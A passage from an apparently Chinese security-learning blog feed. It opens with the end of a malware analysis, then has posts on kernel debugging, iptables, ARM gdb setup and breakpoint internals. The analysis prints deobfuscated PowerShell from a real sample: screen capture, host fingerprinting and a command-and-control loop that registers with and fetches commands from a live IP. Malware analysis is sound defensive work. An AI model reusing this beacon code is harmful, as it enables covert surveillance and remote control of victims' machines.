class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取系统位数<code>wmic.exe</code>使用<code>Win32_OperatingSystem).OSArchitecture</code></p><p>错误返回<code>&quot;Architecture Error&quot;</code>.</p><h5 id="Get-Screenshot"><a href="#Get-Screenshot" class="headerlink" title="Get-Screenshot"></a>Get-Screenshot</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-Screenshot</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">Add-Type</span> -Assembly System.Windows.Forms;</span><br><span class="line">    <span class="variable">$I6G70ff34UmS</span> = [Windows.Forms.SystemInformation]::VirtualScreen;</span><br><span class="line">    <span class="variable">$EFZ1lbLwseYcDKV7</span> = <span class="built_in">New-Object</span> Drawing.Bitmap <span class="variable">$I6g70Ff34uMS</span>.Width, <span class="variable">$I6g70FF34ums</span>.Height;</span><br><span class="line">    <span class="variable">$sOmy4QAQ9e</span> = [Drawing.Graphics]::FromImage(<span class="variable">$eFz1LbLWSeYcdkv7</span>);</span><br><span class="line">    <span class="variable">$SOmY4QAQ9e</span>.CopyFromScreen( <span class="variable">$I6g70ff34UMs</span>.Location, [Drawing.Point]::Empty, <span class="variable">$I6g70fF34umS</span>.Size);</span><br><span class="line">    <span class="variable">$SoMY4qAq9e</span>.Dispose();</span><br><span class="line">    <span class="variable">$sb3uxBawrTjS5HJ4zIaU</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;</span><br><span class="line">    <span class="variable">$EFz1lblwseyCdkV7</span>.save(<span class="variable">$SB3uxBAWRtjS5hj4zIaU</span>, [Drawing.Imaging.ImageFormat]::Png);</span><br><span class="line">    <span class="variable">$EFZ1lBLWSeycDkv7</span>.Dispose();</span><br><span class="line">    [convert]::ToBase64String(<span class="variable">$SB3UxbAWrTjS5hj4ZIau</span>.ToArray());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取虚拟屏幕,设置bitmap长宽高,<code>CopyFromScreen</code>将屏幕图像拷贝到新创建的绘制图像的对象中.将图像保存为<code>png</code>图片格式并且将图片数据存入<code>内存流</code>中.将png图片的内存流数据转数组后进行<code>base64</code>编码后返回加密后的值</p><h5 id="S4xKxH-WG0KMOE"><a href="#S4xKxH-WG0KMOE" class="headerlink" title="S4xKxH_WG0KMOE()"></a>S4xKxH_WG0KMOE()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> S4xKxH_WG0KMOE()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$zKxMjXPiRVG_n5lBSQ</span> = D_1smifUAajwThfuQgh(<span class="string">"https://api.ipify.org/"</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ZKxmjXPiRvg_N5LBSq</span> = <span class="string">"IP Error"</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZKxMJXpIrVG_n5lBSq</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取ip地址,错误返回<code>IP Error</code></p><h5 id="CwC1Fafld-XtJSe6wx"><a href="#CwC1Fafld-XtJSe6wx" class="headerlink" title="CwC1Fafld_XtJSe6wx()"></a>CwC1Fafld_XtJSe6wx()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> CwC1Fafld_XtJSe6wx()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="built_in">Test-Path</span> -Path (<span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span>)) <span class="nomarkup">-eq</span> <span class="literal">$True</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$OEnh0UdnFPnPN</span> = (<span class="built_in">Get-ItemProperty</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft\key"</span> -Name SecretKey).SecretKey;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$R_17TGuFklA1FDgTjmDMN</span> = <span class="built_in">New-Item</span> -Path <span class="string">"HKCU:\SOFTWARE\Microsoft"</span> -Name key -Force;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$VgMxEqS7XdszsJidfE</span> = [guid]::NewGuid().Guid;</span><br><span class="line">        <span class="built_in">Set-ItemProperty</span> -Path <span class="string">"HKCU:\Software\Microsoft\key"</span> -Name SecretKey -Value <span class="variable">$VgMxEqS7XDSzSjidfe</span>;</span><br><span class="line">        <span class="built_in">start-sleep</span> -s <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$oEnH0udnFPNpN</span> = <span class="variable">$vGMxEQS7XDSzsJIdfe</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$oenH0udnfpnpN</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查键值是否存在.如果存在获得键值.不存在的话新建项,再创建健值,写入guid.</p><h5 id="QTix4hIfIA2oQE8g"><a href="#QTix4hIfIA2oQE8g" class="headerlink" title="QTix4hIfIA2oQE8g()"></a>QTix4hIfIA2oQE8g()</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> QTix4hIfIA2oQE8g()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UC55RYB_3NieoNp</span> = <span class="built_in">New-Object</span> Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());</span><br><span class="line">        <span class="variable">$mmMfY1GeC_ZHoT3</span> = <span class="variable">$uC55ryb_3Nieonp</span>.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$mMmFY1GeC_ZHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$TRUe</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfY1GeC_zHoT3</span> = <span class="string">"Admin"</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$MMMFy1GEC_zHoT3</span> <span class="nomarkup">-eq</span> <span class="literal">$false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$mMMfy1GEc_zhot3</span> = <span class="string">"User"</span>;</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$mMMFY1gEc_zHoT3</span> = <span class="string">"Error Role"</span>;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mMMfY1GEC_zHoT3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得令牌访问等级,判断是否再鹳狸猿组,是返回Admin,不是返回<code>User</code>.没有的话返回<code>Error Role</code>.</p><h5 id="yKGVMK8K"><a href="#yKGVMK8K" class="headerlink" title="yKGVMK8K()"></a>yKGVMK8K()</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function yKGVMK8K()</span><br><span class="line">&#123;</span><br><span class="line">    $N4aN42GXmRJ = Cwc1FAfLd_XTJse6WX;</span><br><span class="line">    $n4an42gxMRj += &quot;:&quot;;</span><br><span class="line">    $n4an42gxMRJ += WlTjBGnp; //Username</span><br><span class="line">    $n4aN42GxMRJ += &quot;:&quot;;</span><br><span class="line">    $N4An42GxMrJ += VDf4TktOMY3P_Br8UL5nH; //SystemNameame</span><br><span class="line">    $N4aN42gxmrJ += &quot;&quot;;</span><br><span class="line">    $N4an42GxMrj += aj9VVbp5c; //OS Arch</span><br><span class="line">    $N4an42gxMrj += &quot;:&quot;;</span><br><span class="line">    $n4aN42GxmrJ += S4XKXh_wG0KMOE; //ip address</span><br><span class="line">    $N4aN42gxmrj += &quot;:&quot;;</span><br><span class="line">    $N4AN42gxMrJ += qTix4hiFia2oQe8G; //UserInrole</span><br><span class="line">    return $n4an42gxMRJ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拼接信息.</p><h5 id="最后的逻辑分析"><a href="#最后的逻辑分析" class="headerlink" title="最后的逻辑分析"></a>最后的逻辑分析</h5><p>8350行左右</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(True)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$xGWoj_n</span> = ykGVMk8k;</span><br><span class="line">    <span class="variable">$VGmxeqS7XdsZsJidfe</span> = CwC1FaFld_xTJSe6Wx;</span><br><span class="line">    n_n9tYyoAi9M6lB (<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=reg&amp;UU="</span>+&#123;guid&#125;) <span class="variable">$XgWoj_n</span>; //</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$r_17tGufKlA1FDgTjmDMN</span> = d_1smIfUAAjWthFUqGH( <span class="string">"http://83.171.238.62/command/"</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$R_17TgufKla1FdGTjmdmn</span> <span class="nomarkup">-ne</span> (<span class="string">'Error'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$ImSwyJmd_fJGEkqlFUV</span> = <span class="variable">$r_17tGufkla1FDGtJmDmn</span>;</span><br><span class="line">d_1SMIFuAajwtHFuqGh(<span class="string">"http://83.171.238.62/ls.php?TOKEN=Pomy54tvbRetceX&amp;funx=uDel&amp;filename="</span>+&#123;guid&#125;+<span class="string">".cmd"</span>);</span><br><span class="line">            mUHr7u0HAhhRaXq <span class="variable">$iMswYJMd_fJGeKQLFUv</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$EI30VubHIRyTC9q5rk878</span> = <span class="variable">$wu9qWfKFH</span>;</span><br><span class="line">    <span class="variable">$KkB6gQH8Z1</span> = <span class="variable">$BZDhtwfnPOb_v_h</span>;</span><br><span class="line">    <span class="variable">$I2w_uXTB</span> = (([int](<span class="number">15770</span> / <span class="number">10</span>))*<span class="variable">$kkB6GQH8Z1</span>);</span><br><span class="line">    <span class="variable">$wu9QWfkfH</span> = ((-<span class="number">2276</span>)*((<span class="number">8153</span> - <span class="number">3952</span>)+(((-<span class="number">3651</span>)-<span class="variable">$Uf4CDF6_B9NwImxt7Hh</span>)*(-<span class="number">39</span> + <span class="number">3047</span>))));</span><br><span class="line">    <span class="variable">$JNipBG0Ov_kT15R</span> = ((((<span class="number">1</span> * <span class="number">1009</span>)*<span class="variable">$V0Jkv8aqZHMdcdppAixIV</span>)+<span class="variable">$uyoxQcm_VhLGn</span>)*((-<span class="number">2374</span>)-((-<span class="number">883</span>)*(-<span class="number">774</span>))));</span><br><span class="line">    <span class="variable">$T9y70kYH</span> = (-(<span class="number">13</span> * <span class="number">211</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>执行上个函数获得系统信息</li><li>上传屏幕截图</li><li>下载<code>.cmd</code>文件</li><li>如果下载内容不为’’Error’’则<code>d_1SMIFuAajwtHFuqGh</code>下载其他<code>.cmd</code>命令,并执行.</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>断断续续把这个样本分析完了,属实体力活啊.感觉整体文章结构没写好.都是从头到尾分析样本文件,最后应该文章里做大致的规划,应该更具有从样本编写者角度来看的分析文章.也从零学会了简单的powershell语法和调试等,调试分析office宏汇编分析和脚本.未来还多需努力,少摸鱼,多学习~.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文分析作为学习参考的笔记记录.记录整体细节和不曾知道的地方.&lt;/p&gt;
&lt;p&gt;参考与学习的地址为:&lt;a href=&quot;https://bbs.pediy.com/thread-252477.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-252477.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;脚本类恶意程序分析技巧汇总:&lt;a href=&quot;https://bbs.pediy.com/thread-251102.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.pediy.com/thread-251102.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/ichunqiu/p/8659004.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/ichunqiu/p/8659004.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;谢谢师傅的分析文章.&lt;/p&gt;
&lt;h3 id=&quot;样本分析&quot;&gt;&lt;a href=&quot;#样本分析&quot; class=&quot;headerlink&quot; title=&quot;样本分析&quot;&gt;&lt;/a&gt;样本分析&lt;/h3&gt;&lt;p&gt;微步在线搜寻md5=6cb076f1f42573c5c43083a89bcfe442,下载样本文件并且改名.虚拟机使用&lt;code&gt;Office Tool Plus&lt;/code&gt;安装office.&lt;/p&gt;
&lt;p&gt;使用hashcalc:    &lt;/p&gt;
    
    </summary>
    
      <category term="样本分析" scheme="http://blog.dgmddw.xyz/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
      <category term="宏代码" scheme="http://blog.dgmddw.xyz/tags/%E5%AE%8F%E4%BB%A3%E7%A0%81/"/>
    
      <category term="PowerShell" scheme="http://blog.dgmddw.xyz/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>双机调试简单问题</title>
    <link href="http://blog.dgmddw.xyz/2019/08/24/2019-08-24-%20%E5%8F%8C%E5%87%BB%E8%B0%83%E8%AF%95%E7%AE%80%E5%8D%95%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.dgmddw.xyz/2019/08/24/2019-08-24- 双击调试简单问题总结/</id>
    <published>2019-08-23T16:00:00.000Z</published>
    <updated>2019-11-08T15:50:11.993Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在虚拟机正常安装 VirtualKD, 然后再执行下命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`bcdedit ``/``dbgsettings SERIAL DEBUGPORT:``<span class="number">1</span>` `BAUDRATE:``<span class="number">115200</span>`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://blog.dgmddw.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="VirtualKD" scheme="http://blog.dgmddw.xyz/tags/VirtualKD/"/>
    
  </entry>
  
  <entry>
    <title>iptables简单小结</title>
    <link href="http://blog.dgmddw.xyz/2019/06/18/2019-06-18-iptables%E7%AE%80%E5%8D%95%E5%B0%8F%E7%BB%93/"/>
    <id>http://blog.dgmddw.xyz/2019/06/18/2019-06-18-iptables简单小结/</id>
    <published>2019-06-18T06:19:36.000Z</published>
    <updated>2019-06-18T15:06:33.244Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h3><p>最近这段时间学校要让我们做一些小实验.</p><p>一个实验就是配置iptables: 1.完全屏蔽外网 2.内网只能向外访问http&amp;https&amp;ftp服务.</p><p>然后我将这个总结于对端口进行数据包过滤就好了,不知道这样对不对希望可以指出我的错误.(图解http没怎么看过..</p><p>这样就简单了,上网学习iptables相关命令编写就完事了,不过相关底层原理感觉蛮有意思的,看的<a href="https://blog.csdn.net/qq_38892883/article/details/79709023" target="_blank" rel="noopener">这篇文章</a></p><p>学习的..</p><p>这是简单的shell脚本,运行就行了.本机环境是<code>ubuntu16.04</code>.采用<code>nc</code>和<code>telnet</code>相互验证端口畅通性.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">iptables.sh</span></span><br><span class="line"></span><br><span class="line">set -v</span><br><span class="line">clear</span><br><span class="line">iptables -F</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ssh</span></span><br><span class="line">iptables -A INPUT  -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">http</span></span><br><span class="line"><span class="meta">#</span><span class="bash">https</span></span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --dport 443 -j ACCEPT</span><br><span class="line">iptables -A INPUT -i eth0 -p tcp --sport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ftp</span></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --sport 21 -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -P INPUT DROP  </span><br><span class="line">iptables -P FORWARD DROP  </span><br><span class="line">iptables -P OUTPUT DROP </span><br><span class="line"></span><br><span class="line">iptables -L -n --line-number</span><br></pre></td></tr></table></figure><h3 id="读后总结"><a href="#读后总结" class="headerlink" title="读后总结"></a>读后总结</h3><p>当然这些都是看上述文章一些浅显的,借鉴过来的知识.方便自己看hhh</p><h4 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h4><p>ipfirewall-&gt;ipchains-&gt;iptables</p><h4 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h4><p>通过配置iptables,让内核空间当中的netfilter(网络过滤器)读取配置,并实让现防火墙工作.</p><p>为了实现过滤,要放在内核特定的位置,tcp/ip的协议栈经过的地方(netfilter).</p><p>1.PREROUTING (数据包进入路由前)</p><p>2.INPUT (通过路由表后目的为本机)</p><p>3.FORWARD (通过路由表后,目的地不为本机)</p><p>4.OUTPUT(由本机产生,向外转发)</p><p>5.POSTROUTING（发送到网卡接口之前）</p><p><img src="https://s1.51cto.com/attachment/201304/203657722.png" alt></p><p>现在目前只考虑到filter链上,然后forawrd用作nat转发暂时没有用到,以后可能还会接触到.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Linux" scheme="http://blog.dgmddw.xyz/categories/Linux/"/>
    
    
      <category term="实验" scheme="http://blog.dgmddw.xyz/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>arm环境搭建-gdb调试</title>
    <link href="http://blog.dgmddw.xyz/2019/05/24/2019-05-24-arm%E7%8E%AF%E5%A2%83gdb%E8%B0%83%E8%AF%95/"/>
    <id>http://blog.dgmddw.xyz/2019/05/24/2019-05-24-arm环境gdb调试/</id>
    <published>2019-05-24T05:33:23.000Z</published>
    <updated>2019-11-08T15:49:52.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 最近想学习一下arm指令集,恰好手边有一台多余的二手机.从MIUI刷成原生安卓终于能正常<code>adb push</code>了.</p><p>大多数的环境配置与调试是根据这篇文章<a href="http://www.tasfa.cn/index.php/2016/06/01/android-re-gdb/" target="_blank" rel="noopener">Android逆向系列之动态调试(五)–gdb调试</a>进行学习的.</p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>在这里我做一点补充和效率的提高.</p><ol><li><p>ndk的压缩包从这里<a href="https://developer.android.com/ndk/downloads?hl=zh-CN" target="_blank" rel="noopener">下载</a>.</p></li><li><p>我的压缩包解压后的文件名为<code>android-ndk-r19c</code></p><p>我是小米4的手机.</p></li><li><p>所以使用的gdbserver在<code>\android-ndk-r19c\prebuilt\android-arm\gdbserver</code></p><p>使用的调试编译的可执行文件如as.exe和ld.exe在<code>\android-ndk-r19c\toolchains\arm-linux-androideabi-4.9\prebuilt\windows-x86_64\arm-linux-androideabi\bin</code></p><p>gdb.exe在<code>F:\android_ndk\android-ndk-r19c\prebuilt\windows-x86_64\bin</code></p></li><li><p>已经把gdb.exe添加进环境变量中.</p><p>注意和gdb.exe同一个文件夹的python.exe,需要改名.不然会和自己的原来的python产生冲突.()</p></li><li><p>批处理</p></li></ol><p>​    我把调试的文件一律放在了/data/local/tmp/arm_p/中</p><p>​    然后这是自认为提高效率的东西.</p><p>这是文件树</p><p>​    <img src="https://i.loli.net/2019/05/24/5ce80487b3f5f27607.png" alt></p><p>以下是代码.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdbserver.bat</span><br><span class="line"></span><br><span class="line">adb push pra/%1 /data/<span class="built_in">local</span>/tmp/arm_p</span><br><span class="line">adb shell chmod 777 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br><span class="line">adb shell gdbserver :23946 /data/<span class="built_in">local</span>/tmp/arm_p/%1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:: start_gdb.bat</span><br><span class="line"></span><br><span class="line">adb forward tcp:23946 tcp:23946</span><br><span class="line">gdb -x gdb_script</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:: gdb_script</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> disassemble-next on</span><br><span class="line"><span class="built_in">set</span> step-mode on</span><br><span class="line">target remote 127.0.0.1:23946</span><br></pre></td></tr></table></figure><p>gdbserver.bat  上传文件,启动服务监听</p><p>start_gdb.bat  反汇编,单步调试</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="工具" scheme="http://blog.dgmddw.xyz/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="arm" scheme="http://blog.dgmddw.xyz/tags/arm/"/>
    
      <category term="gdb" scheme="http://blog.dgmddw.xyz/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>断点原理</title>
    <link href="http://blog.dgmddw.xyz/2019/04/07/2019-04-07-%E6%96%AD%E7%82%B9%E5%8E%9F%E7%90%86/"/>
    <id>http://blog.dgmddw.xyz/2019/04/07/2019-04-07-断点原理/</id>
    <published>2019-04-07T05:33:23.000Z</published>
    <updated>2019-11-08T15:48:47.980Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="CC断点"><a href="#CC断点" class="headerlink" title="CC断点"></a>CC断点</h3><p>F2断点.\</p><p>设置无数个.</p><p>将断下的指令地址处的第一个字节设置为0xCC</p><p>0xCC对应<code>int3</code>,专门用来调试的中断指令.</p><p>触发EXCEPTION_BREAKPOINT的异常,进行相应的处理</p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>检测首地址是否为CCH</p><h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>或者是<code>PAGE_GUARD</code></p><blockquote><p>A: 内存访问断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_NOACCESS，当被调试程序对这个内存进行任何“读、写或运行”操作时，都会触发异常。</p><p>B: 内存写入断点，OD将目标内存所在的页面（范围圆整为1000h的倍数）设置为PAGE_EXECUTE_READ，当被调试程序对这个内存进行“写”操作时触发异常。</p></blockquote><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>我们使用VirtualProtectEx进行内存页修改,通过GetLastError获取到的值进行判断,进行相关处理</p><h4 id="反反内存断点"><a href="#反反内存断点" class="headerlink" title="反反内存断点"></a>反反内存断点</h4><p>VirtualQuery，VirtualQueryEx，VirtualProtect，VirtualProtectEx</p><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>利用CPU自带的调试寄存器DR0-DR3设置硬件断点,产生SINGLE_STEP异常.</p><p>四个寄存器 最多四个断点.</p><p>DR7是控制位,控制断点方式.DR6显示断点原因</p><p><strong><a href="https://www.pediy.com/kssd/pediy06/pediy6751.htm" target="_blank" rel="noopener">学习大佬的文章</a></strong></p><h3 id="单步执行"><a href="#单步执行" class="headerlink" title="单步执行"></a>单步执行</h3><ul><li><ol><li>通过调试符号获取当前对应的行信息, 并保存该信息.</li><li>设置TF位, 